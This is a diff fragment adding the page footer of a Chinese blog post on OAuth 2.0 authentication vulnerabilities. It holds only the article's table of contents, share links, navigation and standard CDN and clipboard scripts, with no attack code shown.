+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOAuth"><span class="toc-number">2.</span> <span class="toc-text">什么是OAuth?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth-2-0-%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">OAuth 2.0 是怎么运行的?</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">隐式授权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%A0%81%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">授权码方式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.</span> <span class="toc-text">OAuth 身份验证机制介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%E7%9A%84%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">OAuth身份验证漏洞是如何产生的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABOAuth%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">识别OAuth身份验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Recon"><span class="toc-number">7.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8OAuth%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">如何利用OAuth身份验证漏洞？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">OAuth客户端应用程序中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E7%B1%BB%E5%9E%8B%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8D%E9%80%82%E5%BD%93"><span class="toc-number">9.1.</span> <span class="toc-text">隐式授权类型中的实现不适当</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%BA%E4%B9%8FCSRF%E4%BF%9D%E6%8A%A4"><span class="toc-number">9.2.</span> <span class="toc-text">缺乏CSRF保护</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2authorization-codes%E5%92%8Caccess-tokens"><span class="toc-number">9.3.</span> <span class="toc-text">泄露authorization codes和access tokens</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E9%87%8D%E5%AE%9A%E5%90%91URI%E9%AA%8C%E8%AF%81"><span class="toc-number">9.4.</span> <span class="toc-text">有缺陷的重定向URI验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96%E4%BB%A3%E7%A0%81%E5%92%8C%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-number">9.5.</span> <span class="toc-text">通过代理页面窃取代码和访问令牌</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">9.5.1.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2"><span class="toc-number">9.5.2.</span> <span class="toc-text">示例2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scope%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">scope验证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">10.1.</span> <span class="toc-text">授权码模式下的权限提升</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">10.2.</span> <span class="toc-text">隐式授权下的权限提升</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E7%BB%8F%E9%AA%8C%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C"><span class="toc-number">11.</span> <span class="toc-text">未经验证的用户注册</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&text=OAuth2.0身份验证中的漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&is_video=false&description=OAuth2.0身份验证中的漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OAuth2.0身份验证中的漏洞&body=Check out this article: http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&name=OAuth2.0身份验证中的漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&t=OAuth2.0身份验证中的漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
